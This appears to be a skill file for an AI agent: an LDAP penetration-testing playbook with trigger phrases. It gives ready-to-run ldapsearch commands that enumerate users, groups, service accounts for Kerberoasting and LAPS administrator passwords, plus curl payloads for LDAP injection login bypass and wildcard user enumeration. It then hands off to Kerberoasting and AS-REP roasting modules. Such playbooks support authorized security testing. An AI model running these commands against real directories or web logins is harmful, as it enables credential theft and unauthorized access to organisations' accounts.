---
name: proto-ldap
description: "LDAP security testing — anonymous bind, LDAP injection, user enumeration, attribute extraction, Kerberoasting prep, LDAP injection bypass. Triggers: 'ldap', 'ldap security', 'ldap injection', 'ldap pentest', 'ldap enumeration', 'anonymous bind', 'ldap auth bypass', 'active directory ldap'."
---

# LDAP Security Testing

Enumerate LDAP directory services and test for injection and access control issues.

---

## Phase 1: Anonymous Bind Testing

```bash
DC_IP="TARGET_IP"
DOMAIN_BASE="DC=target,DC=local"

ldapsearch -H "ldap://$DC_IP" -x -s base namingcontexts
ldapsearch -H "ldap://$DC_IP" -x -b "$DOMAIN_BASE" "(objectclass=*)" | head -30

ldapsearch -H "ldap://$DC_IP" -x -b "$DOMAIN_BASE" \
  "(objectclass=user)" sAMAccountName 2>/dev/null | grep "sAMAccountName:" | \
  awk '{print $2}' | tee output/ldap_users.txt

ldapsearch -H "ldap://$DC_IP" -x -b "$DOMAIN_BASE" \
  "(objectclass=group)" cn | grep "cn:" | tee output/ldap_groups.txt
```

---

## Phase 2: Authenticated Enumeration

```bash
DC_IP="TARGET_IP"
DOMAIN_BASE="DC=target,DC=local"
USER="testuser"
PASS="Password123"

ldapsearch -H "ldap://$DC_IP" -D "$USER@target.local" -w "$PASS" \
  -b "$DOMAIN_BASE" "(objectclass=user)" \
  sAMAccountName userPrincipalName memberOf pwdLastSet | tee output/ldap_users_full.txt

ldapsearch -H "ldap://$DC_IP" -D "$USER@target.local" -w "$PASS" \
  -b "$DOMAIN_BASE" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName | \
  tee output/ldap_spns.txt

ldapsearch -H "ldap://$DC_IP" -D "$USER@target.local" -w "$PASS" \
  -b "$DOMAIN_BASE" "(objectclass=computer)" ms-Mcs-AdmPwd | \
  grep "ms-Mcs-AdmPwd" | tee output/ldap_laps.txt

ldapsearch -H "ldap://$DC_IP" -D "$USER@target.local" -w "$PASS" \
  -b "$DOMAIN_BASE" "(objectclass=domain)" minPwdLength lockoutThreshold | tee output/ldap_policy.txt
```

---

## Phase 3: LDAP Injection

```bash
TARGET="https://TARGET"

curl -s -X POST "$TARGET/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin)(&","password":"anything"}'

curl -s -X POST "$TARGET/api/search" \
  -H "Content-Type: application/json" \
  -d '{"username":"*"}'

for CHAR in a b c d e f g; do
  RESP=$(curl -s "$TARGET/api/search?user=$CHAR*" 2>/dev/null)
  [ "$(echo $RESP | wc -c)" -gt 100 ] && echo "Users starting with: $CHAR"
done
```

---

## Output

Save to `output/`:
- `ldap_users.txt` — enumerated user accounts
- `ldap_spns.txt` — SPN accounts (Kerberoastable)
- `ldap_laps.txt` — LAPS passwords if accessible

## Next Phase

→ `ad-attacks` for Kerberoasting and AS-REP roasting
→ `proto-kerberos` for Kerberos-specific attacks
